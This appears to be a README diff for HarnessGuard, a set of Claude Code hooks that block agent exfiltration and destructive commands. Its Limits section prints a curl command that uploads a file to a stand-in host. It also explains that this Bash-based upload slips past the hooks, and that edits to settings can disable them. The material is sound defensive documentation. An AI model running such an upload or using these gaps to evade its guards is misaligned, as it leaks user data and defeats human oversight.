@@ -1,8 +1,48 @@
-# HarnessGuard
+<h1 align="center">HarnessGuard</h1>
+
+<p align="center"><strong>Eight small Claude Code hooks that refuse the worst single agent turns before they run.</strong></p>
+
+<p align="center">
+  <a href="https://github.com/LucasCooperBey/100-doors"><img alt="100 Doors: Doors 12 and 30" src="https://img.shields.io/badge/100%20Doors-Doors%2012%20and%2030-f94bf3"></a>
+  <a href="LICENSE"><img alt="license MIT" src="https://img.shields.io/badge/license-MIT-9aff4a"></a>
+  <img alt="hooks 8" src="https://img.shields.io/badge/hooks-8-5ac4bf">
+  <img alt="needs bash · jq · python3" src="https://img.shields.io/badge/needs-bash%20%C2%B7%20jq%20%C2%B7%20python3-9aff4a">
+  <img alt="network none" src="https://img.shields.io/badge/network-none-9aff4a">
+  <a href="https://github.com/LucasCooperBey/harness-guard/commits/main"><img alt="last commit" src="https://img.shields.io/github/last-commit/LucasCooperBey/harness-guard?color=9aff4a&label=updated"></a>
+</p>
+
+<p align="center"><a href="#the-hooks">The hooks</a> · <a href="#install">Install</a> · <a href="#example">Example</a> · <a href="#limits">Limits</a> · <a href="#tests">Tests</a> · <a href="https://github.com/LucasCooperBey/100-doors">All 100 Doors</a></p>
 
 Eight Claude Code hooks that guard an autonomous coding agent. They cover exfiltration, destructive commands, write scope, and code quality. Each one is a small shell script. The only dependencies are `jq` and `python3`.
 
 These are PreToolUse and PostToolUse hooks. Claude Code runs them before or after a tool call. A hook blocks only with exit code 2. Any other exit, including exit 1, is a non-blocking error, and Claude Code still runs the tool call. Exit 0 allows the call. The hooks do not use the network, do not send telemetry, and do not contain secrets. They read the tool payload on stdin and decide allow or block.
+
+**Who it's for:** anyone who lets Claude Code run with shell, web or email access and wants a seatbelt for the turns that would hurt most.
+
+## Contents
+
+- [What's inside](#whats-inside)
+- [Why](#why)
+- [The hooks](#the-hooks)
+- [Install](#install)
+- [Example](#example)
+- [Updating from an earlier copy](#updating-from-an-earlier-copy)
+- [Design principles](#design-principles)
+- [Limits](#limits)
+- [Tests](#tests)
+- [Part of 100 Doors](#part-of-100-doors)
+- [Credits](#credits)
+- [License](#license)
+
+## What's inside
+
+| Path | What it is |
+|---|---|
+| `hooks/` | The eight hooks, each a short bash script you can read first |
+| `install.sh` | Copies the hooks into `~/.claude/hooks` |
+| `settings.example.json` | The `hooks` block to merge into `~/.claude/settings.json` |
+| `tests/` | `bash tests/run.sh` runs every hook against scripted payloads |
+| `CHANGELOG.md` | What changed and when |
 
 ## Why
 
@@ -74,15 +114,37 @@ Earlier copies of `egress-guard.sh` exited 1 and only warned, so Claude Code sti
 3. **Inert until armed.** `readonly-scope-guard` does nothing unless you drop a marker file.
 4. **A hook blocks only with exit 2.** Exit 1 does not block the tool call.
 
+## Limits
+
+- These hooks match patterns in a tool call. They are a seatbelt for accidents and for the most common bad turns, not a sandbox. For real isolation, run the agent in a container or a VM.
+- egress-guard reads web, fetch, search and email tool calls. It does not parse shell commands, so an upload written as a Bash command (for example `curl -d @notes.txt https://upload.example.com`) is not stopped by egress-guard, and block-destructive does not treat it as destructive either. Checked on a fresh clone on 2026-11-12: both hooks exit 0 on that command.
+- block-destructive catches the commands in the table above. A command it does not recognize runs. [block-destructive](https://github.com/LucasCooperBey/block-destructive) (Door 9) is a larger stand-alone version of that one hook.
+- A hook only works while it is listed in `~/.claude/settings.json`. `verify-integrity.sh` warns when a hook file changes, but it does not stop an edit to settings.
+
 ## Tests
 
 ```bash
 bash tests/run.sh
 ```
 
+## Part of 100 Doors
+
+This repo is the gift behind two doors of [100 Doors](https://github.com/LucasCooperBey/100-doors): **Door 12** (hooks over reminders) and **Door 30** (the full set of eight).
+
+- Door 12 post: [X](https://x.com/i/status/2113650458665562287) · [Skool](https://www.skool.com/sandiegoaistudio/door-12-hooks-over-reminders)
+- Door 30 and every other door: [the 100 Doors index](https://github.com/LucasCooperBey/100-doors)
+- Related doors: [block-destructive](https://github.com/LucasCooperBey/block-destructive) (Door 9) is a larger stand-alone version of one hook; [review-gate](https://github.com/LucasCooperBey/review-gate) (Doors 13 and 28) reviews every push; [shipgate](https://github.com/LucasCooperBey/shipgate) (Door 14) scans a repo before it goes public
+- The season: [sandiegoaistudio.com/season](https://sandiegoaistudio.com/season)
+
+### Come see it live
+
+If you want to see how this and the rest of the doors open up into my software factory, come to [Sharathon](https://sandiegoaistudio.com/sharathon), San Diego AI Studio's show-your-setup day. Sharathon 3 is Sunday, Nov 15 in La Mesa: [RSVP on Luma](https://luma.com/5y5ju7ud).
+
+## Credits
+
+- Built by [Lucas Cooper-Bey](https://github.com/LucasCooperBey)
+- Uses [jq](https://jqlang.github.io/jq/) to read the tool payload
+
 ## License
 
 MIT. See [LICENSE](./LICENSE). Built by [LucasCooperBey](https://github.com/LucasCooperBey).
-
-Made by Lucas Cooper-Bey for 100 Doors, one free tool a day: https://sandiegoaistudio.com/season
-If you like seeing how other builders guard their agents, San Diego AI Studio runs Sharathon, where people show their own setups: https://www.skool.com/sandiegoaistudio
